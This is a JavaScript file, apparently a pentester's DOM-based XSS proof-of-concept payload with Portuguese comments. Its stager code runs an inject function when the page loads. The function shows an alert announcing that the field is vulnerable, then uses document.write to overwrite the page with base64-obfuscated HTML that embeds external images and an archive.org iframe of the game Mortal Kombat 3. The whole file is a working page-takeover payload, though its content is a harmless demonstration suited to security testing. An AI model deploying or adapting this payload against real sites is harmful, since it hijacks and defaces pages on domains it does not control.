console.log("Teste de XSS DOM Based by André Henrique!! Injetando payload! :D");

// Sobrescrever o corpo do documento
function inject() {
	console.log("Stager: Injetando o iFrame...");
	document.title = "XSS in Pentest by Andre Henrique";
	
	//document.getElementsByTagName('body')[0].innerHTML = '';

	alert("ISH AVISA:\n\nSe vc estah lendo este aviso, o campo/field testado estah vulneravel a XSS DOM Based!\nIsto significa que um atacante, podera executar codigos JavaScript arbitrariamente\nno dominio " + document.domain + "!\n\nEntao, vamos provar isto jogando o clássico Mortal Kombat 3 de 1995!!");

	document.addEventListener("DOMContentLoaded", function(event) {
		var pocish= "PGh0bWw+DQo8aGVhZD4NCjxpbWcgc3JjPSIgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21yaGVucmlrZS9JU0hfUGF5bG9hZHMvbWFzdGVyL0lTSC5wbmciIGFsdD0iIj4NCjxzdHlsZT4NCmJvZHkgew0KICBiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsNCiAgYmFja2dyb3VuZC1pbWFnZTogdXJsKCJodHRwczovLzQuYnAuYmxvZ3Nwb3QuY29tLy15SXZkdjlPRVZXby9WcWlhcUtVN2d2SS9BQUFBQUFBQVI0VS92cUZjR2pkVkUtdy9zMzIwL0Nhcm5hdmFsJTJCMTMuZ2lmIik7DQp9DQpoMSB7DQogIHRleHQtYWxpZ246IGNlbnRlcjsNCiAgdGV4dC10cmFuc2Zvcm06IHVwcGVyY2FzZTsNCiAgY29sb3I6ICM1NmZmMDA7DQp9DQo8L3N0eWxlPg0KPC9oZWFkPg0KPGJvZHk+DQo8Y2VudGVyPjxpZnJhbWUgc3JjPSJodHRwczovL2FyY2hpdmUub3JnL2VtYmVkL3NnX01vcnRhbF9Lb21iYXRfM18xOTk1X0FjY2xhaW1fTWlkd2F5X1NjdWxwdHVyZWRfU29mdHdhcmVfV2lsbGlhbXNfRVVfZW4iIGZyYW1lYm9yZGVyPSIwIiB3ZWJraXRhbGxvd2Z1bGxzY3JlZW49InRydWUiIG1vemFsbG93ZnVsbHNjcmVlbj0idHJ1ZSIgYWxsb3dmdWxsc2NyZWVuPjwvaWZyYW1lPjxjZW50ZXI+DQo8bWFycXVlZT48aDE+IC0tLS0tLS0tLSBBIElTSCBUZWNub2xvZ2lhLCBEZXNlamEgYSBUb2RvcyB1bSBGZWxpeiBDYXJuYXZhbCEhIC0tLS0tLS0tLS08L2gxPjwvbWFycXVlZT4NCjwvYm9keT4NCjwvaHRtbD4=";

		document.open();
		document.write(atob(pocish));
		document.close();
	});
}

// Verificar se o DOM pode ser injetado imediatamente ou se deve ser chamado por meio de eventos
if (document.readyState === "complete" || document.readyState === "interactive") {
	console.log("Stager: DOM Ok");
	inject();
} else if (window.attachEvent) {
	console.log("Stager: Anexando ao Onload");
	window.attachEvent('onload', inject);
} else if (window.addEventListener) {
	console.log("Stager: Anexando ao Load");
	window.addEventListener('load', inject, false);	
} else {
	console.log("Stager: Fallback para o Contador do iFrame");
	fc = document.getElementsByTagName('iframe').length;
	setInterval(
		function() {
			if (document.getElementsByTagName('iframe').length != fc) {
				return;
			} else {
				inject();
			}
		},
		300
	);
}
